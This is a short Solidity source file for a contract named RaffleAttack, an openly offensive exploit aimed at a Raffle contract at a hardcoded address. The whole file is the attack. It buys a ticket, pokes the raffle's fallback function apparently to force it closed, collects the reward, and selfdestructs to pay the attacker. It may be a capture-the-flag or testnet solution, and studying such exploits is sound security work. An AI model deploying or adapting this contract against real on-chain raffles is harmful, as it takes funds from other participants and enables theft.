pragma solidity 0.4.24;
import './Raffle.sol';
contract RaffleAttack {
  address owner;
  address raffleContractAddr = 0x61c335fa65beb7b1e27a7d38c743237ed4b5b1d4;
  Raffle raffle = Raffle(raffleContractAddr);
  constructor() public {
    owner = msg.sender;
  }
  function buy() external payable {
    require(msg.value == 0.1 ether);
    raffle.buyTicket.value(0.1 ether)();
  }
  function close() external {
    raffleContractAddr.call.value(0 ether)();
  }
  function collect() external {
    raffle.collectReward();
  }
  function get_money() external {
    selfdestruct(owner);
  }
  function () public payable {
  }
}